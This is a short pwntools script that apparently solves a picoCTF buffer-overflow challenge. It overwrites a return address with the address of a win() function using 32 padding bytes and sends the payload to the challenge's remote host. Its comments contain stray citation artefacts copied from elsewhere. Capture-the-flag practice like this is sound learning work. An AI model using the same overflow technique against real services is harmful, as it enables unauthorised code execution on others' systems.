from pwn import *

# 1) Load the ELF and resolve the 'win' symbol
elf = ELF("./chall3")                            # populates elf.symbols… :contentReference[oaicite:0]{index=0}
win_addr = elf.symbols['win']                   # get the address of win() :contentReference[oaicite:1]{index=1}

# 2) Pack that address as a little‑endian 64‑bit value
#    p64() does exactly this for you on x86_64 :contentReference[oaicite:2]{index=2}
packed_win = p64(win_addr)

# 3) Build the payload: 32 A’s, then the packed address
def make_payload():
    payload = b"A" * 32 + packed_win
    print(payload)
    return payload

# 4) Use it
p = remote("mimas.picoctf.net", 52896)
p.sendline(b"2")
p.recvuntil(b"buffer:")
p.sendline(make_payload())
p.recvuntil(b"choice:")
p.sendline(b"4")
print(p.recvall())
